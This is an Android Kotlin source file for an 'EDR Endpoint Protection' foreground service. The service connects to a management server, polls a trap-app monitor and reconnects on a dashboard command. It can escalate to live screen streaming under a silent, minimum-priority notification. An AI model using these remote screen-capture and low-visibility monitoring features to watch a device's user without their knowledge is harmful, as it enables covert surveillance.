package com.edr.agent.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.edr.agent.EdrApplication
import com.edr.agent.monitor.TrapAppMonitor
import com.edr.agent.network.EdrWebSocketClient
import com.edr.agent.storage.SyncPreferences
import com.edr.agent.ui.MainActivity
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class EdrForegroundService : Service() {

    private var wsClient: EdrWebSocketClient? = null
    private val pollClient = OkHttpClient.Builder()
        .connectTimeout(1500, TimeUnit.MILLISECONDS)
        .readTimeout(1500, TimeUnit.MILLISECONDS)
        .build()

    /**
     * Single-thread scheduler for background polling tasks.
     * We use a LOW polling rate (5 seconds) because the AccessibilityService now provides
     * instant window-change events for the TrapAppMonitor. The poller here is only a fallback
     * for devices where AccessibilityService events may be delayed.
     */
    private val monitorScheduler: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.i(TAG, "Starting EDR Endpoint Protection Service")

        // Start as a foreground service with LOW priority notification (minimal battery impact)
        try {
            val notification = createNotification()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not start foreground: ${e.message}")
        }

        // Initialize Trap App Monitor with saved packages from storage
        TrapAppMonitor.initialize(this)

        // Fallback poller: runs every 5 seconds as a safety net for the A11y instant events.
        // Also polls server connection status if currently disconnected to allow remote reconnect.
        monitorScheduler.scheduleWithFixedDelay({
            try {
                TrapAppMonitor.checkForegroundApp(this)
            } catch (e: Exception) {
                Log.w(TAG, "TrapAppMonitor check error: ${e.message}")
            }

            try {
                if (wsClient?.isConnected != true) {
                    checkServerConnectionRequest()
                }
            } catch (e: Exception) {
                // Ignore network errors while offline
            }
        }, 5L, 5L, TimeUnit.SECONDS)

        // Connect to EDR management server
        wsClient = EdrWebSocketClient(this)
        wsClient?.connect()
    }

    /**
     * Promote the service foreground type to MEDIA_PROJECTION when live screen streaming starts.
     * Required on Android 14+ before calling getMediaProjection().
     */
    fun promoteToMediaProjection() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val notification = createNotification()
                var fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
                startForeground(NOTIFICATION_ID, notification, fgsType)
                Log.i(TAG, "Promoted to MEDIA_PROJECTION foreground type for live screen streaming")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed promoting to MEDIA_PROJECTION: ${e.message}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    fun disconnectWebSocket() {
        wsClient?.disconnect()
        Log.i(TAG, "WebSocket disconnected by dashboard command.")
    }

    fun reconnectWebSocket() {
        if (wsClient == null) {
            wsClient = EdrWebSocketClient(this)
        }
        wsClient?.resetDisconnectAndConnect()
        Log.i(TAG, "WebSocket reconnected by dashboard command.")
    }

    private fun checkServerConnectionRequest() {
        val deviceId = SyncPreferences.deviceId
        val port = SyncPreferences.serverPort
        val candidates = listOf("127.0.0.1", SyncPreferences.serverHost).distinct()

        for (host in candidates) {
            try {
                val url = "http://$host:$port/api/devices/$deviceId/connection-status"
                val request = Request.Builder().url(url).get().build()
                val response = pollClient.newCall(request).execute()
                if (response.isSuccessful) {
                    val body = response.body?.string() ?: ""
                    if (body.contains("\"shouldConnect\":true")) {
                        Log.i(TAG, "Server connection-status requested connect. Connecting to $host...")
                        if (wsClient == null) {
                            wsClient = EdrWebSocketClient(this)
                        }
                        wsClient?.resetDisconnectAndConnect(host)
                        break
                    }
                }
            } catch (ignored: Exception) {
                // Host not reachable right now, try next candidate
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        monitorScheduler.shutdownNow()
        wsClient?.disconnect()
        Log.w(TAG, "EDR Service destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        val launchIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
        )

        return NotificationCompat.Builder(this, EdrApplication.CHANNEL_ID)
            .setContentTitle("EDR Endpoint Protection")
            .setContentText("Device security monitoring active")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            // LOW priority = minimal battery and no sound/vibration
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }

    companion object {
        private const val TAG = "EdrForegroundService"
        private const val NOTIFICATION_ID = 1001
        var instance: EdrForegroundService? = null
            private set
    }
}
